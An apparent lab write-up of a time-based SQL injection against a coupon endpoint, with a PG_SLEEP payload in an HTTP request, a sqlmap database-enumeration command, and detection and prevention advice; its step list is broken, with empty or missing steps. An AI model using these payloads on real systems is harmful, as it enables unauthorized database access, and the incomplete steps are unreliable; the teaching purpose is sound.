# 💉 SQL Injection

## What It Is

**SQL Injection** happens when user-supplied input gets dropped directly into a SQL query without proper validation or parameterization. That lets an attacker reshape the query itself — leading to unauthorized data access, data modification, or full data extraction.

## 🎯 Target Endpoint

```
http://<target-host>/workshop/api/shop/apply_coupon
```

## ✅ Normal Request

```http
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: <target-host>
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{"coupon_code":"test","amount":75}
```

## ⏱️ Time-Based SQL Injection

```http
POST /workshop/api/shop/apply_coupon HTTP/1.1
Host: <target-host>
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{"coupon_code":"test';SELECT PG_SLEEP(5)--","amount":75}
```

## 🔍 Why This Works

The `coupon_code` field is vulnerable. The payload:
```sql
test';SELECT PG_SLEEP(5)--
```

breaks out of the original query string and tacks on a brand-new SQL statement. Triggering `PG_SLEEP(5)` adds an artificial delay — and if the response genuinely takes ~5 seconds longer, that's solid confirmation of a time-based injection point.

**Original (intended) query:**
```sql
SELECT * FROM coupons WHERE coupon_code = 'test';
```

**What it becomes with the payload injected:**
```sql
SELECT * FROM coupons WHERE coupon_code = 'test';
SELECT PG_SLEEP(5)--';
```

## 💥 Impact

- Unauthorized access to the underlying database
- Extraction of sensitive data — user records, credentials, etc.
- Authentication bypass
- Full database enumeration
- Potentially complete system compromise, depending on what privileges the DB user has

> ⚠️ **Never commit a real bearer token, API key, or session cookie to a public repo.** If you're saving real request files for your own reference, keep them out of version control (e.g. add them to `.gitignore`) — only the sanitized template above belongs in published notes.

```bash
sqlmap -r sqli-test.txt -p coupon_code --dbs
```

### Step 3 — List Tables
```bash

```


### Step 5 — Dump the Sensitive Data

## 🔎 How to Detect It

- Inject special characters like `'`, `"`, `;`
- Try time-based payloads — `PG_SLEEP(...)` for Postgres, `SLEEP(...)` for MySQL
- Watch for:
  - Unexpected response delays
  - Database error messages leaking through
  - Any shift in how the application behaves

---

## 🛡️ How to Prevent It

### Use Parameterized Queries
- Prepared statements, every time
- Never build SQL strings by directly concatenating user input

### Validate Input Strictly
- Validate and sanitize everything coming from the client
- Enforce expected data types — a coupon code field should reject anything that isn't a plain alphanumeric string

### Lean on a Safe ORM
- Use ORM frameworks that parameterize queries automatically and resist raw injection

### Apply Least Privilege
- Scope the database account used by the app down to only what it actually needs
- Never run application queries through an admin-level database account

### Handle Errors Carefully
- Never surface raw database error messages back to the client — they're a goldmine for attackers trying to fingerprint the backend

---

## 📌 Key Takeaway

SQL Injection stays one of the most dangerous classes of vulnerability precisely because it gives an attacker direct access to the database itself. Even a single unvalidated parameter can be enough to compromise an entire database if the right protections aren't in place.
